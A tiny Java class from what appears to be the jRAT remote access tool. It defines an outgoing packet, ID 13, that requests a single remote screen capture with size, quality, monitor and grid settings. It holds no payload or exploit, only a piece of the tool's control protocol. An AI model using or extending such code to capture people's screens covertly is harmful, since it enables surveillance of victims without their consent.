package se.jrat.client.packets.outgoing;

public class Packet13OneRemoteScreen extends Packet12RemoteScreen {

	public Packet13OneRemoteScreen(int size, int quality, int monitor, int columns, int rows) {
		super(size, quality, monitor, columns, rows);
	}

	@Override
	public byte getPacketId() {
		return 13;
	}

}
